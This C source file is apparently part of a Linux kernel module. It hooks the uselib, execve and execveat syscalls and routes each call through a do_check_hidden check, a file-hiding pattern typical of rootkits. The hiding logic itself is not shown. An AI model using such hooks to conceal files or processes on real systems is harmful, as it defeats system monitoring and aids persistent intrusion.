#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_uselib syscall hook handler
SYSCALL_HOOK_HANDLER1(uselib, orig_uselib, p_regs, const char __user *, s_filename)
{
    pr_dev_info("uselib(%p)\n", s_filename);

    return do_check_hidden(orig_uselib, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_execve syscall hook handler
SYSCALL_HOOK_HANDLER3(execve, orig_execve, p_regs, const char __user *, s_filename,
                      const char __user *const __user *, ps_argv, const char __user *const __user *,
                      ps_envp)
{
    pr_dev_info("execve(%p, %p, %p)\n", s_filename, ps_argv, ps_envp);

    return do_check_hidden(orig_execve, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_execveat syscall hook handler
SYSCALL_HOOK_HANDLER5(execveat, orig_execveat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, const char __user *const __user *, ps_argv,
                      const char __user *const __user *, ps_envp, int, i32_flags)
{
    pr_dev_info("execveat(%d, %p, %p, %p, %s%#x)\n", i32_dfd, s_filename, ps_argv, ps_envp,
                SIGNED_ARG(i32_flags));

    return do_check_hidden(orig_execveat, p_regs, i32_dfd, s_filename, i32_flags);
}
